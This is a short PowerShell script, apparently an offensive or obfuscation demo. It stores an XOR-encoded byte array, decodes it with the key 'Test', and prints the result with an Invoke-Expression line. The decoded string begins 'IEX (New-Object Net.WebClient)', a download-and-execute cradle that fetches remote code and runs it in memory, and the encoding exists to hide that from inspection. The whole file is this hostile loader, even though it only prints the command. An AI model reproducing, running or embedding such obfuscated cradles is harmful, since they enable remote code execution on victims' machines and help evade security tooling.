
[byte[]] $payload = 29,32,43,84,124,43,22,3,121,42,17,30,49,6,7,84,26,0,7,90,3,0,17,55,56,12,22,26,32,76,93,48,59,18,29,24,59,4,23,39,32,23,26,26,51,77,84,28,32,17,3,7,110,74,92,6,53,18,93,19,61,17,27,1,54,16,0,17,38,6,28,26,32,0,29,0,122,6,28,25,123,3,6,19,61,17,26,2,33,22,92,16,49,3,7,27,59,17,27,91,57,4,0,0,49,23,92,61,58,19,28,31,49,72,62,29,57,12,24,21,32,31,93,4,39,84,84,93,111,44,29,2,59,14,22,89,25,12,30,29,63,4,7,14,116,72,48,27,57,8,18,26,48,69,81,4,38,12,5,29,56,0,20,17,110,95,23,17,54,16,20,84,39,0,24,1,38,9,0,21,110,95,31,27,51,10,29,4,53,22,0,3,59,23,23,7,118, 
 
function xor_rotate($plaintext, $key)
{
  $cyphertext = ""
  $keyposition = 0
  $KeyArray = $key.ToCharArray()
  $plaintext.ToCharArray() | foreach-object -process {
	   $cyphertext += [char]([byte][char]$_ -bxor $KeyArray[$keyposition])
	   $keyposition += 1
	   if ($keyposition -eq $key.Length) {$keyposition = 0}
  }
  return $cyphertext
}

$key = "Test"
$pString = [System.Text.Encoding]::UTF8.GetString($payload)
$cmd = xor_rotate $pString $key
Write-Host "Payload: $cmd"
Write-Host "Invoke-Expression $cmd"
